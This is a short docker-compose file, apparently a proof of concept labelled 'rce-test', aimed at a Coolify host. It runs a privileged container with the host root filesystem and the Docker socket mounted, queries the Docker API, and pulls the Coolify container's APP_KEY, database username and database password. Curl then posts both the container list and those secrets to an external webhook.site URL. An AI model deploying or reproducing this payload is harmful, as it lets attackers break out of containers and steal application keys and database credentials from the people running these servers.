version: '3.8'
services:
  rce-test:
    image: 'alpine:3.19'
    privileged: true
    network_mode: host
    volumes:
      - '/:/host-root'
      - '/var/run/docker.sock:/var/run/docker.sock'
    command:
      - sh
      - -c
      - |
        apk add --no-cache curl
        
        # 1. Проверка: список контейнеров через Docker API
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | \
          curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=docker_api_test
        
        # 2. Получить переменные окружения контейнера coolify
        curl -s --unix-socket /var/run/docker.sock http://localhost/containers/coolify/json | \
          grep -o '"APP_KEY=[^"]*"\|"DB_PASSWORD=[^"]*"\|"DB_USERNAME=[^"]*"' | \
          curl -X POST --data-binary @- https://webhook.site/b403c049-bece-4ab0-9939-375e99823557?stage=coolify_env
        
        sleep 3600
